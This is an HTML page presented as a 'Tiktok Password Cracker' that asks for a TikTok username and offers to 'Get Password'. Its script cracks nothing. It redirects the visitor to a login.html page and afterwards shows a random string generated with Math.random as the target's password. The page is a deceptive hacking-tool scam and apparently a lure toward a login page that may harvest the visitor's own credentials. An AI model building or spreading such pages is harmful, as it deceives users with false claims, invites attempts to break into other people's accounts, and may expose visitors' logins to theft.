<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiktok Password Cracker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #121212;
        }
        .snapchat-yellow {
            color: #000;
        }
    </style>
</head>
<body class="bg-gray-900 text-gray-100 flex items-center justify-center min-h-screen p-4">

    <div class="bg-gray-800 p-8 rounded-2xl shadow-2xl w-full max-w-md space-y-6 transform transition-all duration-300 hover:scale-105">
        <div class="text-center">
            <h1 class="text-3xl font-bold mb-2">
                <span class="snapchat-yellow"></span> Tiktok Password Cracker
            </h1>
            <p class="text-gray-400">Password Hacking</p>
        </div>

        <div class="space-y-4">
            <div>
                <label for="username" class="block text-sm font-medium text-gray-400">Tiktok Username</label>
                <input type="text" id="username" placeholder="e.g., GhostlySnapLover" class="mt-1 block w-full px-4 py-3 bg-gray-700 border-gray-600 rounded-lg text-gray-200 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-snapchat-yellow">
            </div>
            <button id="generateBtn" class="w-full flex justify-center items-center py-3 px-4 rounded-lg text-gray-900 font-bold bg-gradient-to-r from-yellow-300 to-yellow-500 hover:from-yellow-400 hover:to-yellow-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-yellow-500 transition-all duration-200 ease-in-out">
                Get Password
            </button>
        </div>

        <div class="space-y-4">
            <div>
                <label for="outputPassword" class="block text-sm font-medium text-gray-400">Generated Password</label>
                <div class="mt-1 flex rounded-lg shadow-sm">
                    <input type="text" id="password" readonly class="flex-1 block w-full px-4 py-3 bg-gray-700 border-gray-600 rounded-l-lg text-gray-200 font-mono text-lg truncate focus:outline-none">
                    <button onclick="copyToClipboard()" class="px-4 py-3 bg-gray-600 rounded-r-lg text-gray-300 hover:bg-gray-500 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-400 transition-all duration-200 ease-in-out">
                        ðŸ“‹
                    </button>
                </div>
            </div>

            <div id="statusMessage" class="text-center text-sm font-medium text-red-400"></div>
        </div>
    </div>

    <script>
    function generatePassword(length = 12) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678!@";
  let pass = "";
  for (let i = 0; i < length; i++) {
    pass += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return pass;
}

// Auto-generate if user came back
if (sessionStorage.getItem("generatePassword") === "yes") {
  document.getElementById("password").value = generatePassword();
  sessionStorage.removeItem("generatePassword");
}

document.getElementById("generateBtn").addEventListener("click", () => {
  sessionStorage.setItem("generatePassword", "yes");
  window.location.href = "login.html";
});
    </script>
</body>
